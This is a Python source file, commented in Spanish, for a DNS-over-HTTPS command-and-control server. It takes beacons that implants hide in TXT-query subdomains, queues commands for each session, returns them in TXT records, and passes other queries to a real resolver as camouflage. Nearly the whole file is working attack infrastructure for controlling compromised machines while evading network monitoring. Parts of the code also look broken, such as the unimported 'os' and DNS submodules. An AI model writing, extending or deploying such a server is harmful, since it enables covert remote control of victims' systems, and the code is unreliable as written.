import asyncio
import aiohttp
from aiohttp import web
import ssl
import json
import base64
import hashlib
from datetime import datetime
import sqlite3
from cryptography.fernet import Fernet
import logging
import dns.resolver
import dns.message
import dns.rdatatype

# Configuración
CONFIG = {
    'HOST': '0.0.0.0',
    'PORT': 443,
    'DNS_PORT': 53,
    'DOH_ENDPOINT': '/dns-query',
    'ENCRYPTION_KEY': Fernet.generate_key(),
    'SESSION_TIMEOUT': 86400  # 24 horas
}

class DoHC2Server:
    def __init__(self):
        self.app = web.Application()
        self.setup_routes()
        self.sessions = {}
        self.commands_queue = {}
        
    def setup_routes(self):
        """Configura endpoints"""
        self.app.router.add_get(CONFIG['DOH_ENDPOINT'], self.handle_doh_get)
        self.app.router.add_post(CONFIG['DOH_ENDPOINT'], self.handle_doh_post)
        self.app.router.add_get('/health', self.handle_health)
        
    async def handle_doh_get(self, request):
        """Maneja GET requests DoH"""
        try:
            # Extraer datos de query DNS
            dns_query = request.query.get('dns', '')
            if dns_query:
                decoded = base64.urlsafe_b64decode(dns_query + '==')
                dns_msg = dns.message.from_wire(decoded)
                
                # Procesar query
                response = await self.process_dns_query(dns_msg)
                return web.Response(
                    body=response.to_wire(),
                    content_type='application/dns-message'
                )
                
        except Exception as e:
            logging.error(f"DoH GET error: {e}")
            
        return web.Response(status=400)
    
    async def handle_doh_post(self, request):
        """Maneja POST requests DoH"""
        try:
            # Leer mensaje DNS
            data = await request.read()
            dns_msg = dns.message.from_wire(data)
            
            # Procesar query
            response = await self.process_dns_query(dns_msg)
            return web.Response(
                body=response.to_wire(),
                content_type='application/dns-message'
            )
            
        except Exception as e:
            logging.error(f"DoH POST error: {e}")
            
        return web.Response(status=400)
    
    async def process_dns_query(self, dns_msg):
        """Procesa query DNS y responde"""
        response = dns.message.make_response(dns_msg)
        
        for question in dns_msg.question:
            qname = str(question.name)
            qtype = question.rdtype
            
            # Extraer datos del subdominio
            if qtype == dns.rdatatype.TXT:
                # Los implantes envían datos en subdominios TXT
                if 'telemetry' in qname:
                    # Procesar beacon
                    session_id = qname.split('.')[0]
                    await self.process_beacon(session_id, qname)
                    
                    # Responder con comandos (si hay)
                    if session_id in self.commands_queue:
                        command = self.commands_queue[session_id].pop(0)
                        txt_data = f"cmd:{command}"
                        response.answer.append(
                            dns.rrset.from_text(
                                qname, 300, dns.rdataclass.IN,
                                dns.rdatatype.TXT, txt_data
                            )
                        )
                    
                elif 'result' in qname:
                    # Resultados de comandos
                    await self.process_result(qname)
            
            else:
                # Para otras queries, responder normalmente
                try:
                    answer = await dns.resolver.resolve(qname, qtype)
                    response.answer.extend(answer.rrset)
                except:
                    # NXDOMAIN para queries desconocidas
                    response.set_rcode(dns.rcode.NXDOMAIN)
        
        return response
    
    async def process_beacon(self, session_id, qname):
        """Procesa beacon de implante"""
        try:
            # Extraer datos codificados
            encoded_data = qname.split('.')[0]
            decoded = base64.urlsafe_b64decode(encoded_data + '===')
            data = json.loads(decoded)
            
            # Actualizar sesión
            self.sessions[session_id] = {
                'last_seen': datetime.now(),
                'data': data,
                'ip': None  # DoH oculta IP real
            }
            
            logging.info(f"Beacon from {session_id}")
            
        except:
            pass
    
    async def process_result(self, qname):
        """Procesa resultados de comandos"""
        try:
            encoded_data = qname.split('.')[0]
            decoded = base64.urlsafe_b64decode(encoded_data + '===')
            result = json.loads(decoded)
            
            logging.info(f"Command result: {result}")
            
        except:
            pass
    
    async def handle_health(self, request):
        """Endpoint de health check"""
        return web.Response(text='OK')
    
    def add_command(self, session_id, command):
        """Agrega comando para sesión"""
        if session_id not in self.commands_queue:
            self.commands_queue[session_id] = []
        
        self.commands_queue[session_id].append(command)
    
    async def cleanup_sessions(self):
        """Limpia sesiones antiguas"""
        while True:
            await asyncio.sleep(3600)  # Cada hora
            
            now = datetime.now()
            expired = []
            
            for session_id, data in self.sessions.items():
                last_seen = data['last_seen']
                if (now - last_seen).total_seconds() > CONFIG['SESSION_TIMEOUT']:
                    expired.append(session_id)
            
            for session_id in expired:
                del self.sessions[session_id]
                if session_id in self.commands_queue:
                    del self.commands_queue[session_id]
            
            logging.info(f"Cleaned up {len(expired)} expired sessions")
    
    async def run(self):
        """Ejecuta servidor"""
        # Crear contexto SSL
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain('server.crt', 'server.key')
        
        # Iniciar limpieza de sesiones
        asyncio.create_task(self.cleanup_sessions())
        
        # Configurar runner
        runner = web.AppRunner(self.app)
        await runner.setup()
        
        site = web.TCPSite(
            runner,
            CONFIG['HOST'],
            CONFIG['PORT'],
            ssl_context=ssl_context
        )
        
        await site.start()
        
        print(f"[*] DoH C2 Server running on https://{CONFIG['HOST']}:{CONFIG['PORT']}")
        print(f"[*] DoH endpoint: {CONFIG['DOH_ENDPOINT']}")
        
        # Mantener servidor corriendo
        await asyncio.Event().wait()

async def main():
    server = DoHC2Server()
    await server.run()

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════╗
    ║         ADVANCED DoH C2 SERVER              ║
    ║    DNS-over-HTTPS Command & Control         ║
    ╚══════════════════════════════════════════════╝
    """)
    
    # Generar certificados si no existen
    if not os.path.exists('server.crt'):
        print("[*] Generating SSL certificates...")
        os.system(
            'openssl req -x509 -newkey rsa:4096 '
            '-keyout server.key -out server.crt '
            '-days 365 -nodes -subj "/CN=localhost" 2>/dev/null'
        )
    
    # Ejecutar servidor
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
